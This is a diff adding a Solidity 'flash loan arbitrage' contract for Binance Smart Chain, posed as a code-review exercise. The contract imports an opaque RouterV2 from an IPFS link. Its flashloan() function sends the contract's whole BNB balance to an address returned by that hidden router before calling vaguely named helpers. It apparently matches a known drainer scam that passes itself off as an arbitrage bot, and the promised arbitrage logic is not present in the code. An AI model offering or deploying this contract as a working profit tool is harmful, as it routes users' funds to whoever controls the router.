@@ -1,0 +1,113 @@
+//Suppose that your colleagues have developed this smart contract to be deployed on the Binance Smart Chain (EVM compatible) to swap between PancakeSwap and BakerySwap and to keep the arbitrage profits in BNB (Binance token). The goal of the contract is to take out a flash loan, and use that flash loan to profit from some arbitrage opportunities on PancakeSwap.
+ 
+//You are asked to do a code review to maintain the quality of the code. Please review the code and then 1) identify any areas for improvement, and 2) revise the code accordingly (if needed).
+
+//You can use Remix IDE or any tools/IDEs you prefer during the code review.
+
+ 
+pragma solidity ^0.5.0;
+
+ 
+
+// PancakeSwap Smart Contracts
+
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+
+ 
+//BakerySwp Smart contracts
+
+import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";
+
+ 
+// Router
+
+import "https://gateway.pinata.cloud/ipfs/QmUjKUcP21Jig4kuXYghYLZwrWyq5evQkQkGBvERgn9qfk";
+
+ 
+// Multiplier-Finance Smart Contracts
+
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+
+ 
+contract InitiateFlashLoan {
+
+    
+
+    RouterV2 router;
+
+    string public tokenName;
+
+    string public tokenSymbol;
+
+    uint256 flashLoanAmount;
+
+ 
+    constructor(
+
+        string memory _tokenName,
+
+        string memory _tokenSymbol,
+
+        uint256 _loanAmount
+
+    ) public {
+
+        tokenName = _tokenName;
+
+        tokenSymbol = _tokenSymbol;
+
+        flashLoanAmount = _loanAmount;
+
+ 
+        router = new RouterV2();
+
+    }
+
+ 
+    function() external payable {}
+
+ 
+    function flashloan() public payable {
+
+        // Send required coins for swap
+
+        address(uint160(router.pancakeSwapAddress())).transfer(
+
+            address(this).balance
+
+        );
+
+  
+        router.borrowFlashloanFromMultiplier(
+
+            address(this),
+
+            router.bakerySwapAddress(),
+
+            flashLoanAmount
+
+        );
+
+ 
+
+        router.convertBnbToBusd(msg.sender, flashLoanAmount / 2);
+
+        
+
+        router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);
+
+ 
+
+        router.transferBnbToMultiplier(router.pancakeSwapAddress());
+
+ 
+
+        router.completeTransation(address(this).balance);
+
+    }
+
+}
